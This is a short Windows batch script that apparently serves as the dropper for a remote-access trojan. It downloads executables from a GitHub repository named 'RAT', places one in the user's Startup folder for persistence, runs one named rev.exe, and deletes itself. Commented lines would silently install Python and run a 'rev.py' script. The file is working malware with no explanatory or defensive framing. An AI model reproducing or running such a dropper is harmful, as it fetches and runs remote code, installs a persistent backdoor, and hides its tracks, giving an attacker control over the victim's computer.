@echo off
set "currentd=%cd%"

@rem cd "c:\Program Files\Python310\" && cd %currentd% || curl -o python-installer.exe https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe & python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
@rem "c:\Program Files\Python310\python.exe" rev.py
curl -o startup.bat https://raw.githubusercontent.com/saifnasef/RAT/main/startup.bat

cd "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
curl -o per.exe https://raw.githubusercontent.com/saifnasef/RAT/main/persis.exe
cd %currentd%
curl -o rev.exe https://raw.githubusercontent.com/saifnasef/RAT/main/rev.exe
rev.exe
del "%~f0"
